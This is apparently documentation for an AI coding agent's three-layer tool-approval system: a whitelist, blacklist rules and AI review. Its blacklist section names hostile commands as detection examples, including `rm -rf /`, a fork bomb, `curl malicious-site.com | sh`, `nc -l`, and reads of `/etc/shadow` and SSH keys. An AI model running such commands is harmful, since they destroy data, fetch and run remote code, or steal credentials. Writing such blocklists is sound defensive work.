# Smart Mode - Intelligent Approval System

## Overview

Smart Mode is a new security approval feature introduced in xAgent CLI 1.0.0. It provides intelligent security protection through a three-layer progressive approval architecture while ensuring development efficiency.

## Three-Layer Approval Architecture

Smart Mode uses a progressive approval process, with each layer having specific responsibilities:

```
User Request → Whitelist Check → Blacklist Check → AI Review → Execution Decision
    ↓              ↓                ↓              ↓              ↓
   Safe       Pass Directly    Risk Detection  AI Analysis   User Confirm/Auto Execute
```

### Layer 1: Whitelist Check

- **Purpose**: Quickly identify and pass verified safe tools
- **Mechanism**: Maintain a predefined list of safe tools
- **Result**: Whitelisted tools execute directly without further review
- **Advantage**: Zero latency, improving efficiency for common operations

**Whitelisted Tools**:

Information Reading Tools:
- `Read`
- `ListDirectory`
- `SearchCodebase`
- `Grep`
- `image_read`

Task Management Tools:
- `todo_write`
- `todo_read`
- `task`
- `exit_plan_mode`
- `web_search`

File Editing Tools:
- `replace`
- `Write`

Other Safe Tools:
- `web_fetch`
- `ask_user_question`
- `save_memory`
- `xml_escape`
- `InvokeSkill`

### Layer 2: Blacklist Check

Rule-based detection of high-risk operations, covering the following main risk categories:

**System Destruction**:
- Delete root directory: `rm -rf /`
- Delete system directories: delete `/etc`, `/usr`, `/bin`
- Batch delete files: wildcard-based batch deletion
- Format disk: `mkfs`, `format`
- Overwrite disk data: `dd`

**Privilege Escalation**:
- Modify sudo permissions: modify `/etc/sudoers`
- Set SUID permissions: set special permissions for programs
- Modify file permissions to 777: set file to rwx for all users
- Disable security modules: disable SELinux, firewall, Windows Defender, etc.

**Data Theft**:
- Read password files: access `/etc/passwd`, `/etc/shadow`
- Read SSH keys: access `~/.ssh/id_rsa`
- Search for password information: search for password-related info in system
- Upload files to external: use `curl`, `wget`
- Remote code execution: `curl malicious-site.com | sh`

**Network Attacks**:
- Network scanning: `nmap`
- Create network listener: `nc -l`
- Clear firewall rules: `iptables -F`

**Resource Exhaustion**:
- Fork bomb: `:() { :|:& };:`
- Infinite loop: `while true; do ... done`

### Layer 3: AI Intelligent Review

When tool calls don't match whitelist or blacklist, they enter AI intelligent review. The AI reviewer analyzes the following dimensions:

1. Whether the operation has malicious intent
2. Whether it may cause data leakage
3. Whether it may compromise system integrity
4. Whether it follows best practices

## Usage

### Enable via Command Line

```bash
xagent start --approval-mode smart
```

### Enable via Configuration File

Add to `.xagent/settings.json`:

```json
{
  "approvalMode": "smart"
}
```

### Switch at Runtime

Use slash command in xAgent CLI session:

```bash
/mode smart
```

View all available modes:

```bash
/mode
```

## User Experience

### Safe Operations (Whitelist)

```
> Read project configuration file
✅ [Smart Mode] Tool 'Read' passed whitelist check, executing directly
  Detection: Whitelist
  Latency: 1ms
```

### Risky Operations (Blacklist Triggered)

```
> Delete temporary files
🟠 [Smart Mode] Detected potentially risky operation
📊 Risk Level: HIGH
🔍 Detection: Blacklist Rules
⚠️  Description: Detected system file deletion command
Potential risk detected, continue execution?
[y] Yes  [n] No
```

### AI Review Scenario

```
> Batch process user data
🟡 [Smart Mode] AI review detected medium risk
📊 Risk Level: MEDIUM
🔍 Detection: AI Intelligent Review
🤖 AI Analysis: Batch data operation may affect user privacy, confirm data processing scope
Potential risk detected, continue execution?
[y] Yes  [n] No
```

## Performance Characteristics

- **Whitelist Check**: < 1ms, memory lookup
- **Blacklist Check**: < 50ms, regex matching
- **AI Review**: < 5s

## Debug Mode

Enable debug mode to view detailed approval process:

```bash
DEBUG=smart-approval xagent start --approval-mode smart
```

Example Output:

```
[SmartApprovalEngine] Evaluating tool call: run_shell_command
[WhitelistChecker] Tool 'run_shell_command' not in whitelist
[BlacklistChecker] Checking command: rm -rf /tmp/cache
[BlacklistChecker] Matched rule: System File Deletion, Risk: HIGH
[SmartApprovalEngine] Decision: RISKY, Layer: blacklist, Latency: 23ms
```

## FAQ

### Q: Smart Mode approval is too strict, affecting development efficiency?

A: Smart Mode's whitelist already includes most commonly used safe tools. If you encounter frequent false positives:

- Check if you're using tool aliases not in the whitelist
- Review specific blacklist rules for being too strict
- Consider temporarily switching to other approval modes in development environment

### Q: AI review often times out?

A: AI review depends on network connection. If timeouts occur frequently:

- Check network connection status
- Confirm login status (requires aone or xAgent account)
- Consider disabling AI review when network is unstable

### Q: How to view approval statistics?

A: Use debug mode to view detailed logs:

```bash
DEBUG=smart-approval xagent start --approval-mode smart
```

## Implementation Details

### Core Files

- `src/smart-approval.ts` - Smart approval engine core implementation
- `src/tools.ts` - Tool execution logic, integrated with smart approval
- `src/config.ts` - Configuration management, added approvalMode support
- `src/cli.ts` - Command line arguments, added --approval-mode option
- `src/session.ts` - Session management, supports smart mode
- `src/slash-commands.ts` - Slash commands, added /mode smart support
- `src/remote-ai-client.ts` - Remote AI client (remote mode support)

### Main Classes

- `SmartApprovalEngine` - Smart approval engine main class
- `WhitelistChecker` - Whitelist checker
- `BlacklistChecker` - Blacklist checker
- `AIApprovalChecker` - AI approval checker

### Remote Mode Support

Smart Mode has different behaviors in remote mode (OAuth authentication):

1. **Local Mode** (API Key Authentication):
   - All three layers of approval execute locally
   - Whitelisted tools pass directly
   - Blacklisted tools require user confirmation
   - Unknown tools are reviewed by local AI

2. **Remote Mode** (OAuth Authentication):
   - Tools are synchronized to remote server
   - Remote LLM is responsible for tool approval
   - Local AIApprovalChecker approves directly
   - Tool execution results sync back to local

### Type Definitions

```typescript
export enum ApprovalDecision {
  APPROVED = 'approved',
  REJECTED = 'rejected',
  REQUIRES_CONFIRMATION = 'requires_confirmation',
  AI_REVIEW = 'ai_review'
}

export enum RiskLevel {
  LOW = 'LOW',
  MEDIUM = 'MEDIUM',
  HIGH = 'HIGH',
  CRITICAL = 'CRITICAL'
}

export interface ApprovalResult {
  decision: ApprovalDecision;
  riskLevel: RiskLevel;
  detectionMethod: 'whitelist' | 'blacklist' | 'ai_review' | 'manual';
  description: string;
  latency: number;
  aiAnalysis?: string;
}

export interface ToolCallContext {
  toolName: string;
  params: any;
  timestamp: number;
}
```

## Related Links
- [xAgent CLI GitHub](https://github.com/xagent-ai/xagent)
- [Architecture Overview](./docs/architecture/overview.md)
- [Tool System Design](./docs/architecture/tool-system-design.md)
